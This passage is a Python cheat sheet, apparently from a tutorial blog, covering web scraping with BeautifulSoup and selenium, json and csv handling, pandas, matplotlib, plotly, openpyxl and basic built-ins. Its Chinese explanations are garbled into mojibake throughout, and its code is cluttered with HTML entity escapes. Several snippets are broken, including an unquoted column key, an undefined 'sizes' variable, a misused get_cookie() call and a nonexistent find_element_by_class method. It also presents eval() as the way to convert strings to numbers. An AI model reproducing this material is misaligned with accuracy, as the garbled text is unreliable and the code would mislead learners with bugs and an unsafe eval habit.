courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] é€éé¸æ“‡å™¨ç¯©é¸æ¨™ç±¤ - .select(åŒCSSé¸æ“‡å™¨,Classæˆ–ID) è‹¥æœ‰ç©ºæ ¼æœƒæœ‰å•é¡Œï¼Œsoup.select(.\u0026quot;title p\u0026quot;) æœƒå ±éŒ¯ï¼Œç©ºæ ¼éœ€ä½¿ç”¨.find()ã€.findAll() 1 2 3 4 5 6 7 # ä½¿ç”¨Classé¸æ“‡å™¨ print(soup.select(\u0026#34;.title\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] # ä½¿ç”¨IDé¸æ“‡å™¨ print(soup.select(\u0026#34;#link1\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;a class=\u0026#34;py1\u0026#34; href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt;] jsonæ¨¡çµ„ è¼‰å…¥æ¨¡çµ„ 1 import json jsonè½‰dict - json.loads(\u0026quot;å­—ä¸²\u0026quot;) 1 2 3 4 5 6 7 import json txt = \u0026#39;{ \u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34; }\u0026#39; data = json.loads(txt) print(type(data)) # å­—å…¸å‹æ…‹ \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026lt;class \u0026#39;dict\u0026#39;\u0026gt;\u0026#39; dictè½‰json string - json.dumps(\u0026quot;å­—å…¸\u0026quot;) 1 2 3 4 5 6 7 import json txt = { \u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34; } jsonData = json.dumps(txt) print(jsonData) # è½‰æ›å¾Œç‚ºjsonæ ¼å¼çš„å­—ä¸² \u0026gt;\u0026gt;\u0026gt; {\u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34;} csvæ¨¡çµ„ è¼‰å…¥æ¨¡çµ„ 1 import csv ä»¥_csv.readerå‹æ…‹è®€å–csvæª” - csv.reader(æª”æ¡ˆ) 1 2 3 4 5 6 import csv with open(\u0026#39;MI_5MINS_HIST.csv\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as file: rows = csv.reader(file) # ä¸€ç­†ä¸€ç­†å–å‡ºè³‡æ–™ for row in rows: print(row) ä»¥dictå‹æ…‹è®€å–csvæª” - csv.DictReader(æª”æ¡ˆ) 1 2 3 4 5 6 import csv with open(\u0026#39;MI_5MINS_HIST.csv\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as file: rows = csv.DictReader(file) # ä¸€ç­†ä¸€ç­†å–å‡ºè³‡æ–™ for row in rows: print(row) å¯«å…¥csvæª” - csv.writer(æª”æ¡ˆè®Šæ•¸) éœ€å…ˆå®šç¾©ä¸€å€‹ç‰©ä»¶ç‚ºcsv.writer()ï¼Œåœ¨é€²è¡Œå¯«å…¥ã€‚ writerow() ï¼šå–®è¡Œå¯«å…¥ 1 2 3 4 5 6 with open(\u0026#39;Temp.csv\u0026#39;, \u0026#39;w\u0026#39;) as csvfile: writer = csv.writer(csvfile) writer.writerow([\u0026#39;å§“å\u0026#39;, \u0026#39;èº«é«˜\u0026#39;, \u0026#39;é«”é‡\u0026#39;]) writer.writerow([\u0026#39;Jessica\u0026#39;, 158, 45]) writer.writerow([\u0026#39;Wayne\u0026#39;, 172, 60]) ä»¥å­—å…¸å‹æ…‹å¯«å…¥csvæª” - csv.DictWriter(æª”æ¡ˆè®Šæ•¸, fieldnames=æ¬„ä½è®Šæ•¸(åˆ—è¡¨å‹æ…‹)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 with open(\u0026#39;DictTemp.csv\u0026#39;, \u0026#39;w\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as csvfile: # è¨­å®šæ¬„ä½è®Šæ•¸ rowNames = [\u0026#39;å§“å\u0026#39;, \u0026#39;èº«é«˜\u0026#39;, \u0026#39;é«”é‡\u0026#39;] # fieldnames = æŒ‡å®šæ¬„ä½ writer = csv.DictWriter(csvfile, fieldnames=rowNames) # å¯«å…¥æ¬„ä½åç¨± writer.writeheader() #å¯«å…¥è³‡æ–™ writer.writerow({\u0026#39;å§“å\u0026#39;: \u0026#39;Jessica\u0026#39;, \u0026#39;èº«é«˜\u0026#39;: 156, \u0026#39;é«”é‡\u0026#39;: 45}) writer.writerow({\u0026#39;å§“å\u0026#39;: \u0026#39;Wayne\u0026#39;, \u0026#39;èº«é«˜\u0026#39;: 172, \u0026#39;é«”é‡\u0026#39;: 60}) æ¨¡æ“¬ç€è¦½å™¨æ¨¡çµ„(è‡ªå‹•åŒ–æ¸¬è©¦) - selenium å®‰è£ selenium æ¨¡çµ„ Anacondaç·¨è­¯å™¨çš„è©±ï¼Œä½¿ç”¨Anaconda Prompt 1 2 ### anaconda å®‰è£ selenium æ¨¡çµ„ conda install selenium 1 2 ### ä½¿ç”¨ pip å®‰è£ selenium æ¨¡çµ„ pip install selenium ä¸‹è¼‰ç€è¦½å™¨é©…å‹•(web driver)\nå…ˆæŸ¥çœ‹chromeç€è¦½å™¨çš„ç‰ˆæœ¬ï¼ŒGoogleï¼šWeb driver chromeå¾Œä¸‹è¼‰ã€‚\nè¼‰å…¥æ¨¡çµ„\n1 from selenium import webdriver å¯¦ä¾‹åŒ–ä¸€å€‹ç€è¦½å™¨è¦–çª—(Chrome)ï¼Œä¸¦è¨­å®šä¸€å€‹ç€è¦½å™¨ç‰©ä»¶ æª”æ¡ˆåç¨±å‹¿èˆ‡seleniumæ¨¡çµ„åç¨±ç›¸åŒä»¥å…è¡çªè€Œç„¡æ³•åŸ·è¡Œ 1 2 3 from selenium import webdriver driver = webdriver.Chrome() ç™¼é€GETè«‹æ±‚ - ç€è¦½å™¨ç‰©ä»¶.get(ç¶²å€) 1 driver.get(\u0026#34;http://www.baidu.com\u0026#34;) æ ¹æ“šdomå…ƒä»¶çš„id/classå®šä½ - ç€è¦½å™¨ç‰©ä»¶.find_element_by_id(id) æˆ– ç€è¦½å™¨ç‰©ä»¶.find_element_by_class(class) 1 2 # æ‰¾åˆ°idç‚º\u0026#34;kw\u0026#34;çš„inputï¼Œä¸¦è¼¸å…¥\u0026#34;python\u0026#34; driver.find_element_by_id(\u0026#34;kw\u0026#34;).send_keys(\u0026#34;python\u0026#34;) é€å‡ºè¡¨å–® - ç€è¦½å™¨ç‰©ä»¶.domå…ƒä»¶.submit() 1 2 # é€å‡ºidç‚º\u0026#34;su\u0026#34;çš„è¡¨å–® driver.find_element_by_id(\u0026#34;su\u0026#34;).submit() é»æ“Šäº‹ä»¶ - ç€è¦½å™¨ç‰©ä»¶.domå…ƒä»¶.click() 1 2 # é€å‡ºidç‚º\u0026#34;btn\u0026#34;çš„æŒ‰éˆ• driver.find_element_by_id(\u0026#34;btn\u0026#34;).click() å–å¾—é é¢åŸå§‹ç¢¼ - .page_source 1 SourceHtml = driver.page_source è¢å¹•æˆªåœ– - ç€è¦½å™¨ç‰©ä»¶.save_screenshot(æˆªåœ–çš„åœ–æª”åç¨±) 1 driver.save_screenshot(\u0026#34;screen.png\u0026#34;) ç²å–cookies - ç€è¦½å™¨ç‰©ä»¶.get_cookie() 1 2 cookies = driver.get_cookie() print(cookies) é—œé–‰å¯¦ä¾‹åŒ–çš„ç€è¦½å™¨è¦–çª— - ç€è¦½å™¨ç‰©ä»¶.close() æˆ– ç€è¦½å™¨ç‰©ä»¶.quit() 1 2 driver.close() # æˆ– driver.quit() è³‡æ–™åˆ†ææ¨¡çµ„ - Pandas è¼‰å…¥æ¨¡çµ„ 1 import pandas è§£ælisté¡å‹ - pandasç‰©ä»¶.Series(è³‡æ–™) 1 2 3 4 5 6 7 8 9 import pandas data = [20, 10, 15] pds = pandas.Series(data) print(pds) \u0026gt;\u0026gt;\u0026gt; 0 20 \u0026gt;\u0026gt;\u0026gt; 1 10 \u0026gt;\u0026gt;\u0026gt; 2 15 \u0026gt;\u0026gt;\u0026gt; dtype: int64 è§£æDataé¡å‹ - pandasç‰©ä»¶.DataFrame(å­—å…¸å‹æ…‹çš„è³‡æ–™) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 data = pandas.DataFrame({ \u0026#34;name\u0026#34;: [\u0026#34;Amy\u0026#34;, \u0026#34;Jack\u0026#34;, \u0026#34;Cathy\u0026#34;], \u0026#34;salary\u0026#34;: [1000, 5000, 2000] }) print(data) \u0026gt;\u0026gt;\u0026gt; name salary \u0026gt;\u0026gt;\u0026gt; 0 Amy 1000 \u0026gt;\u0026gt;\u0026gt; 1 Jack 5000 \u0026gt;\u0026gt;\u0026gt; 2 Cathy 2000 # å–ç‰¹å®šæ¬„ä½ print(data[salary]) \u0026gt;\u0026gt;\u0026gt; 0 1000 \u0026gt;\u0026gt;\u0026gt; 1 5000 \u0026gt;\u0026gt;\u0026gt; 2 2000 å¯æŒ‡å®šxè»¸æˆ–yè»¸æ¬„ä½åç¨±(columns, index) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import pandas data = [ [65,92,78,83,70], [62,96,81,63,71], [45,58,30,53,75], [90,91,70,90,100], ] index = [\u0026#34;å¼µä¸‰\u0026#34;, \u0026#34;æå››\u0026#34;, \u0026#34;ç‹äº”\u0026#34;, \u0026#34;è¶™é›²\u0026#34;] columns = [\u0026#34;åœ‹æ–‡\u0026#34;, \u0026#34;æ•¸å­¸\u0026#34;, \u0026#34;è‹±æ–‡\u0026#34;, \u0026#34;è‡ªç„¶\u0026#34;, \u0026#34;ç¤¾æœƒ\u0026#34;] df = pandas.DataFrame(data, columns = columns, index = index) print(df) \u0026gt;\u0026gt;\u0026gt; åœ‹æ–‡ æ•¸å­¸ è‹±æ–‡ è‡ªç„¶ ç¤¾æœƒ \u0026gt;\u0026gt;\u0026gt; å¼µä¸‰ 65 92 78 83 70 \u0026gt;\u0026gt;\u0026gt; æå›› 62 96 81 63 71 \u0026gt;\u0026gt;\u0026gt; ç‹äº” 45 58 30 53 75 \u0026gt;\u0026gt;\u0026gt; è¶™é›² 90 91 70 90 100 å›å‚³æœ€å¤§å€¼ - Dataè³‡æ–™.max() 1 2 3 4 5 data = [20, 10, 15] pds = pandas.Series(data) print(pds.max()) \u0026gt;\u0026gt;\u0026gt; 20 å›å‚³æœ€å°å€¼ - è³‡æ–™.min() 1 2 3 4 5 data = [20, 10, 15] pds = pandas.Series(data) print(pds.min()) \u0026gt;\u0026gt;\u0026gt; 10 å–å¾—æŒ‡å®šæ¬„ä½ - Dataè³‡æ–™.loc[x][y] 1 2 3 4 5 6 7 8 9 10 11 12 13 data = pandas.DataFrame({ \u0026#34;name\u0026#34;: [\u0026#34;Amy\u0026#34;, \u0026#34;Jack\u0026#34;, \u0026#34;Cathy\u0026#34;], \u0026#34;salary\u0026#34;: [1000, 5000, 2000] }) print(data) print(data.loc[0][1]) \u0026gt;\u0026gt;\u0026gt; name salary \u0026gt;\u0026gt;\u0026gt; 0 Amy 1000 \u0026gt;\u0026gt;\u0026gt; 1 Jack 5000 \u0026gt;\u0026gt;\u0026gt; 2 Cathy 2000 \u0026gt;\u0026gt;\u0026gt; 1000 è¼¸å‡ºæˆcsv(æˆ–json)æª”æ¡ˆ - Dataè³‡æ–™.to_csv(\u0026quot;æª”å\u0026quot;, encoding=\u0026quot;ç·¨ç¢¼\u0026quot;) æˆ– Dataè³‡æ–™.to_json(\u0026quot;æª”å\u0026quot;, encoding=\u0026quot;ç·¨ç¢¼\u0026quot;) 1 2 3 4 5 6 7 8 9 10 11 import pandas data = [ [65,92,78,83,70], [62,96,81,63,71], [45,58,30,53,75], [90,91,70,90,100] ] index = [\u0026#34;å¼µä¸‰\u0026#34;, \u0026#34;æå››\u0026#34;, \u0026#34;ç‹äº”\u0026#34;, \u0026#34;è¶™é›²\u0026#34;] columns = [\u0026#34;åœ‹æ–‡\u0026#34;, \u0026#34;æ•¸å­¸\u0026#34;, \u0026#34;è‹±æ–‡\u0026#34;, \u0026#34;è‡ªç„¶\u0026#34;, \u0026#34;ç¤¾æœƒ\u0026#34;] df = pandas.DataFrame(data, columns = columns, index = index) df.to_csv(\u0026#39;temp.csv\u0026#39;, encoding=\u0026#34;utf-8-sig\u0026#34;) ç¹ªåœ–æ¨¡çµ„ - plot è¼‰å…¥æ¨¡çµ„ 1 import matplotlib.pyplot as plt ç•«æŠ˜ç·šåœ– - .plot(Xè»¸è³‡æ–™, Yè»¸è³‡æ–™) 1 2 3 4 5 6 7 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # ç•«å‡ºæŠ˜ç·šåœ– plt.plot(x1, y1) é¡¯ç¤ºLabel - .legend() è¦é¡¯ç¤ºlabeléœ€åŸ·è¡Œæ­¤function :ç‚ºé»ç·š, --ç‚ºè™›ç·š, ä¸æŒ‡å®šé è¨­ç‚ºå¯¦ç·š 1 2 3 4 5 6 7 8 9 10 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # :ç‚ºé»ç·š, --ç‚ºè™›ç·š, ä¸æŒ‡å®šé è¨­ç‚ºå¯¦ç·š plt.plot(x1, y1, label=\u0026#34;food\u0026#34;, color=\u0026#34;red\u0026#34;, linestyle=\u0026#34;:\u0026#34;) #è¦é¡¯ç¤ºlabel - éœ€åŸ·è¡Œlegend() plt.legend() æŒ‡å®šåœ–è¡¨æ¨™é¡Œ - .title() 1 plt.title(\u0026#34;å­¸ç”Ÿæˆç¸¾\u0026#34;) æŒ‡å®šX/Yè»¸æ¨™é¡Œ - .xlabel(Xè»¸æ¨™é¡Œ) / .ylabel(Yè»¸æ¨™é¡Œ) 1 2 plt.xlabel(\u0026#34;Xè»¸æ¨™é¡Œ\u0026#34;) plt.ylabel(\u0026#34;Yè»¸æ¨™é¡Œ\u0026#34;) ç•«é•·æ¢åœ– - .bar(Xè»¸è³‡æ–™, Yè»¸è³‡æ–™) 1 2 3 4 5 6 7 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # ç•«å‡ºé•·æ¢åœ– plt.bar(x1, y1) ç•«åœ“é¤…åœ– - .pie(è³‡æ–™) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import matplotlib.pyplot as plt datas = [5,10,20,15] # ç•«å‡ºåœ“é¤…åœ– plt.pie(datas) # è®“ç‰¹å®šå€å¡Šå‡¸å‡º(éœ€èˆ‡è³‡æ–™æ•¸é‡ç›¸åŒ) explode = [0,0,0.05,0] plt.pie(datas, explode = explode) # æŒ‡å®šæ¯å€‹å€å¡Šçš„æ¨™é¡Œ labels = [\u0026#34;æ±éƒ¨\u0026#34;,\u0026#34;å—éƒ¨\u0026#34;,\u0026#34;è¥¿éƒ¨\u0026#34;,\u0026#34;åŒ—éƒ¨\u0026#34;] plt.pie(sizes, labels = labels) # é¡¯ç¤ºç™¾åˆ†æ¯” plt.pie(sizes,autopct=\u0026#34;%3.1f%%\u0026#34;) ç¹ªåœ–æ¨¡çµ„2 - plotly å®‰è£ plotly æ¨¡çµ„ Anacondaç·¨è­¯å™¨çš„è©±ï¼Œéœ€ä½¿ç”¨Anaconda Promptå®‰è£ã€‚ ä½¿ç”¨Jupyter Notebookç·¨è¼¯ 1 2 ### anaconda å®‰è£ plotly æ¨¡çµ„ conda install plotly è¼‰å…¥æ¨¡çµ„(ä¸¦æŒ‡å®šç¹ªåœ–æ¨¡å¼) 1 2 3 4 import plotly # æŒ‡å®šç¹ªåœ–æ¨¡å¼ï¼šScatter, Bar, Pie, Box, Scattergeo, Histogram from plotly.graph_objs import Scatter # æŠ˜ç·šæ•£é»åœ– åœ¨ç·šç¹ªåœ–éœ€æ”¶è²»ï¼Œéœ€ä½¿ç”¨é›¢ç·šç¹ªåœ– 1 plotly.offline.init_notebook_mode(connected=True) æŒ‡å®šX/Yè»¸è³‡æ–™ 1 data = [Scatter(x=[\u0026#34;æ—å¤§å\u0026#34;, \u0026#34;é™³è°æ˜\u0026#34;, \u0026#34;é»ƒç¾éº—\u0026#34;], y=[67,89,72])] ç•«å‡ºæŠ˜ç·šåœ– 1 2 data = [Scatter(x=[\u0026#34;æ—å¤§å\u0026#34;, \u0026#34;é™³è°æ˜\u0026#34;, \u0026#34;é»ƒç¾éº—\u0026#34;], y=[67,89,72])] plotly.offline.iplot({\u0026#34;data\u0026#34;:data}) æŒ‡å®šç¹ªåœ–çš„mode 1 2 3 # markersï¼šåªæœ‰é» / linesï¼šåªæœ‰ç·š / lines + markersï¼šé» + ç·š data = [Scatter(x=[\u0026#34;æ—å¤§å\u0026#34;, \u0026#34;é™³è°æ˜\u0026#34;, \u0026#34;é»ƒç¾éº—\u0026#34;], y=[67,89,72], mode=\u0026#34;markers\u0026#34;)] plotly.offline.iplot({\u0026#34;data\u0026#34;:data}) æŒ‡å®šåœ–è¡¨æ¨™é¡Œ(ç¹ªåœ–æ¨¡å¼é ˆimport Layout) 1 2 3 4 5 6 7 8 9 10 11 12 import plotly from plotly.graph_objs import Scatter, Layout # é›¢ç·šç¹ªåœ–æ¨¡å¼ plotly.offline.init_notebook_mode(connected=True) data = [Scatter(x=[\u0026#34;æ—å¤§å\u0026#34;, \u0026#34;é™³è°æ˜\u0026#34;, \u0026#34;é»ƒç¾éº—\u0026#34;], y=[67,89,72])] # æŒ‡å®šåœ–è¡¨æ¨™é¡Œ plotly.offline.iplot({\u0026#34;data\u0026#34;:data, \u0026#34;layout\u0026#34;:Layout(title=\u0026#34;æˆç¸¾å–®\u0026#34;)}) Excelæ¨¡çµ„ - openpyxl è¼‰å…¥æ¨¡çµ„ 1 import openpyxl å»ºç«‹å·¥ä½œç°¿ç‰©ä»¶ - openpyxl.Workbook() 1 2 # å·¥ä½œç°¿ç‰©ä»¶ workbook = openpyxl.Workbook() å–å¾—æŒ‡å®šå·¥ä½œè¡¨ 1 2 # å·¥ä½œè¡¨ç‰©ä»¶ sheet = workbook.worksheets[0] éµå…¥å€¼ æ–¹æ³•ä¸€ï¼šè¡Œåˆ—æ’å…¥ 1 2 3 # sheetï¼šå·¥ä½œè¡¨ç‰©ä»¶ sheet[\u0026#39;A1\u0026#39;] = \u0026#34;æ¬„ä½ä¸€\u0026#34; sheet[\u0026#39;B1\u0026#39;] = \u0026#34;æ¬„ä½äºŒ\u0026#34; æ–¹æ³•äºŒï¼šè‡ªå‹•æ›è¡Œæ’å…¥ 1 2 3 # sheetï¼šå·¥ä½œè¡¨ç‰©ä»¶ listTitle = [\u0026#34;å§“å\u0026#34;, \u0026#34;é›»è©±\u0026#34;] sheet.append(listTitle) å–å¾—ç‰¹å®šæ¬„ä½çš„å€¼ - .value 1 sheet[\u0026#39;A1\u0026#39;].value å­˜æª” - å·¥ä½œç°¿ç‰©ä»¶.save(æª”å) 1 workbook.save(\u0026#39;test.xlsx\u0026#39;) å–æª” - openpyxl.load_workbook(æª”å) 1 workbook = openpyxl.load_workbook(\u0026#39;test.xlsx\u0026#39;) å–å¾—ç¸½è¡Œæ•¸ - å·¥ä½œè¡¨ç‰©ä»¶.max_row 1 print(sheet.max_row) å–å¾—ç¸½åˆ—æ•¸ - å·¥ä½œè¡¨ç‰©ä»¶.max_column 1 print(sheet.max_column) åˆ°æŒ‡å®šæ¬„ä½ - å·¥ä½œè¡¨ç‰©ä»¶.cell(row=æŒ‡å®šè¡Œæ•¸, column=æŒ‡å®šåˆ—æ•¸) 1 2 # å°å‡ºç¬¬3è¡Œç¬¬2åˆ—çš„å€¼ print(sheet.cell(row=3, column=2).value) Python è³‡æ–™å‹æ…‹ è³‡æ–™å‹æ…‹èªªæ˜ è³‡æ–™å‹æ…‹ èªªæ˜ str å­—ä¸² int æ•´æ•¸ bool å¸ƒæ—å€¼ float æµ®é»æ•¸ None ç©ºå€¼ list [] åˆ—è¡¨ï¼ŒåŒArray tuple () ä¸å¯è®Šæ›´çš„Array dict {} å­—å…¸ï¼ŒåŒObject set () é›†åˆï¼ŒåŒObjectï¼Œä½†keyç‚ºç´¢å¼•å€¼ Python é‹ç®—å­ åŸºæœ¬é‹ç®—å­ é‹ç®—å­ èªªæ˜ + åŠ ï¼šæ•¸å€¼ç›¸åŠ ,å­—ä¸²ç›¸é€£æ¥ - æ¸› * ä¹˜ï¼šæ•¸å€¼ç›¸ä¹˜,å­—ä¸²å¯ä¹˜æ•¸å€¼(pythonç¨æœ‰) / æµ®é»æ•¸é™¤ ** å¹³æ–¹ **0.5 é–‹æ ¹è™Ÿ // æ•´æ•¸é™¤ % å–é¤˜æ•¸ æŒ‡æ´¾é‹ç®—å­ é‹ç®—å­ èªªæ˜ += åŸå€¼ç­‰æ–¼åŸå€¼åŠ  -= åŸå€¼ç­‰æ–¼åŸå€¼æ¸› *= åŸå€¼ç­‰æ–¼åŸå€¼ä¹˜ /= åŸå€¼ç­‰æ–¼åŸå€¼é™¤ åˆ¤æ–·é‹ç®—å­ é‹ç®—å­ èªªæ˜ \u0026gt; å¤§æ–¼ \u0026lt; å°æ–¼ == ç­‰æ–¼ != ä¸ç­‰æ–¼ \u0026gt;= å¤§æ–¼ç­‰æ–¼ \u0026lt;= å°æ–¼ç­‰æ–¼ é‚è¼¯é‹ç®—å­ é‹ç®—å­ èªªæ˜ and ä¸¦ä¸” or æˆ–è€… not åå‘ Python å‡½å¼ å›å‚³è³‡æ–™å‹æ…‹ - type() 1 2 3 4 5 6 7 8 type(3) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; type(\u0026#39;a\u0026#39;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;str\u0026#39;\u0026gt; type(True) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt; type(None) # Pythonçš„ç©ºå€¼ç‚ºNone \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;NoneType\u0026#39;\u0026gt; è¼¸å…¥çª— - input() 1 2 3 4 myName = input(\u0026#34;è«‹è¼¸å…¥å§“åï¼š\u0026#34;) \u0026gt;\u0026gt;\u0026gt; è«‹è¼¸å…¥å§“åï¼šjessica # è¼¸å…¥åå­—å¾Œ print(myName) # å–è¼¸å…¥çš„åå­— \u0026gt;\u0026gt;\u0026gt; jessica å­—ä¸²è½‰æ•¸å€¼ - eval() 1 2 3 num = eval(\u0026#34;3\u0026#34;) print(type(num)) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; ç‰¹æ®Šç¬¦è™Ÿè½‰åé€²ä½ç·¨è™Ÿ - ord() / chr() 1 2 3 4 5 6 7 # ord å°‡ç‰¹æ®Šç¬¦è™Ÿè½‰æ›æˆåé€²ä½ç·¨è™Ÿ ord(\u0026#39;â¤…\u0026#39;) \u0026gt;\u0026gt;\u0026gt; 10501 # chr å°‡åé€²ä½ç·¨è™Ÿè½‰æ›æˆç‰¹æ®Šç¬¦è™Ÿ chr(10501) \u0026gt;\u0026gt;\u0026gt; â¤… å–æœ€å¤§ / æœ€å°å€¼ - max() / min() 1 2 3 4 min(1, 2, 45, 100) \u0026gt;\u0026gt;\u0026gt; 1 max(1, 2, 45, 100) \u0026gt;\u0026gt;\u0026gt; 100 å–çµ•å°æ•¸å€¼ - abs() 1 2 abs(-3.14) \u0026gt;\u0026gt;\u0026gt; 3.14 é€²åˆ¶å­—ä¸²è½‰æ•¸å­— - eval() 1 2 eval(\u0026#34;0o101\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 65 æ•¸å­—è½‰å­—ä¸² - str() 1 2 str(324) \u0026gt;\u0026gt;\u0026gt; \u0026#39;324\u0026#39; å­—ä¸²è½‰æ•¸å­—æˆ–æ•¸å­—è½‰æ•´æ•¸ - int() 1 2 3 4 int(\u0026#34;324\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 324 int(3.14) \u0026gt;\u0026gt;\u0026gt; 3 æµ®é»æ•¸å­—ä¸²è½‰æ•¸å­— - float() 1 2 float(\u0026#34;3.1416\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 3.1416 å››æ¨äº”å…¥ - round(æ•¸å€¼ [,ä½æ•¸]) 1 2 3 4 5 6 round(3.1416) \u0026gt;\u0026gt;\u0026gt; 3 # ç¬¬äºŒå€‹åƒæ•¸å¯å¸¶ä½æ•¸ round(3.1416, 3) \u0026gt;\u0026gt;\u0026gt; 3.142 å¹³æ–¹ - pow(æ•¸å€¼, å¹³æ–¹æ ¹) 1 2 3 # ç¬¬äºŒå€‹åƒæ•¸ç‚ºå¹³æ–¹æ ¹ pow(5, 2) \u0026gt;\u0026gt;\u0026gt; 25 å–å¾—é•·åº¦ - len() ä»»ä½•è³‡æ–™å‹æ…‹éƒ½é€šç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # String strA = \u0026#34;Hello World\u0026#34; len(strA) \u0026gt;\u0026gt;\u0026gt; 11 # Array arrA = [1, 2, 20, 50, 100] len(arrA) \u0026gt;\u0026gt;\u0026gt; 5 # Object objA = {\u0026#34;itemA\u0026#34;:\u0026#34;123\u0026#34;, \u0026#34;itemB\u0026#34;:\u0026#34;456\u0026#34;} len(objA) \u0026gt;\u0026gt;\u0026gt; 2 ç·¨ç¢¼ / è§£ç¢¼ - encode() / decode() 1 2 3 4 5 \u0026#34;ä¸­\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) \u0026gt;\u0026gt;\u0026gt; b\u0026#39;\\xe4\\xb8\\xad\u0026#39; b\u0026#39;\\xe4\\xb8\\xad\u0026#39;.decode(\u0026#34;utf-8\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;ä¸­\u0026#34; å­—ä¸²è½‰å¤§å°å¯« - upper() / lower() 1 2 3 4 5 6 7 StrA = \u0026#34;Hello World!\u0026#34; # å¤§å¯« StrA.upper() \u0026gt;\u0026gt;\u0026gt; \u0026#39;HELLO WORLD!\u0026#39; # å°å¯« StrA.lower() \u0026gt;\u0026gt;\u0026gt; \u0026#39;hello world!\u0026#39; å­—ä¸²å–ä»£ - replace(èˆŠå­—ä¸², æ–°å­—ä¸²) 1 2 3 StrA = \u0026#34;Hello World!\u0026#34; StrA.replace(\u0026#34;World\u0026#34;, \u0026#34;Jessica\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Hello Jessica!\u0026#39; å­—ä¸²åˆ¤æ–·çš„å‡½å¼ å‡½å¼ èªªæ˜ StrA.isalpha() æ˜¯å¦ç‚ºå­—æ¯ StrA.isdigit() æ˜¯å¦ç‚ºæ•¸å­— StrA.isupper() æ˜¯å¦ç‚ºå¤§å¯« StrA.islower() æ˜¯å¦ç‚ºå°å¯« StrA.isidentifer() æ˜¯å¦ç‚ºè­˜åˆ¥å­— StrA.iskeyword() æ˜¯å¦ç‚ºé—œéµå­—,éœ€è¦keywordæ¨¡çµ„ StrA.isspace() æ˜¯å¦ç‚ºç©ºç™½ StrA.istitle() æ˜¯å¦ç‚ºæ¨™é¡Œå­—(ç¬¬ä¸€å€‹å­—ç‚ºå¤§å¯«å‰‡æ˜¯æ¨™é¡Œå­—) å­—ä¸²æœå°‹çš„å‡½å¼ å‡½å¼ èªªæ˜ Str.count(æ–‡å­—A) æœå°‹æ–‡å­—Aå‡ºç¾çš„æ¬¡æ•¸ StrA.startswith(æ–‡å­—A) æ˜¯å¦ç‚ºæ–‡å­—Aé–‹é ­ StrA.endswith(æ–‡å­—A) æ˜¯å¦ç‚ºæ–‡å­—Açµå°¾ StrA.find(æ–‡å­—A) æœå°‹æ–‡å­—Açš„ä½ç½® StrA.rfind(æ–‡å­—A) æœå°‹æ–‡å­—Aæœ€å¾Œå‡ºç¾çš„ä½ç½® å°å‡ºå­—ä¸² - print() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # ä¸€èˆ¬çš„print(é–“éš”é è¨­è‡ªå‹•è£œç©ºæ ¼) print(1, 2, 3) \u0026gt;\u0026gt;\u0026gt; 1 2 3 # é–“éš”ä¸ç©ºæ ¼ print(1, 2, 3, sep=\u0026#34;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 123 # æŒ‡å®šé–“éš”æ–‡å­— print(1, 2, 3, sep=\u0026#34;@\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1@2@3 # æŒ‡å®šçµå°¾æ–‡å­— print(1, 2, 3, sep=\u0026#34;@\u0026#34;, end=\u0026#34;!!!\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1@2@3!!! # æ ¼æ•¸åŒ–è¼¸å‡ºå­—å…ƒ(é–‹é ­å¸¶ä¸€å€‹å°å¯«çš„\u0026#34;f\u0026#34;) print(f\u0026#39;{è®Šæ•¸A}*{è®Šæ•¸B}={è®Šæ•¸A*è®Šæ•¸B}\u0026#39;) \u0026gt;\u0026gt;\u0026gt; A * B = AB å­—ä¸²æ ¼å¼åŒ– - format() å–ä»£å­—ä¸²ä¸­{} 1 2 3 text = \u0026#39;world\u0026#39; print(\u0026#39;hello {}\u0026#39;.format(text)) \u0026gt;\u0026gt;\u0026gt; hello world å¯å¸¶é—œéµå­—å–ä»£ 1 2 3 4 5 name = 